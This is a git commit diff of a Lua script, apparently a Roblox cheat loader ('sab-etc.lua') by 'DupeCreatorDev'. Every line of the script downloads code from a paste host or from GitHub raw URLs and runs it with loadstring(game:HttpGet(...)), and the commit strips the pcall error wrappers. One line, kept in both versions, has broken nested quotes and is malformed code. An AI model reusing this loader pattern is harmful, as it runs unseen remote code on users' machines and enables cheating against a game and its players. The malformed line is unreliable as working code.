eea9eb86ac8021e01067a3d1085807533a7c29fc
DupeCreatorDev <vincejoshua0000@gmail.com>
2025-10-18 01:47:34 +0800

    Update sab-etc.lua

--- sab-etc.lua
+++ sab-etc.lua
@@ -1,15 +1,3 @@
-pcall(function()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/Vp6FHjarV2wBePEq/raw"))()
-end)
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/Vp6FHjarV2wBePEq/raw"))()
 
-task.wait(2)
-
-pcall(function()
-    loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Class/refs/heads/main/Khngscriptt"))()
-end)
-
-task.wait(15)
-
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Finder/refs/heads/main/Khng"))()
-end)
+loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Class/refs/heads/main/Khngscriptt"))()
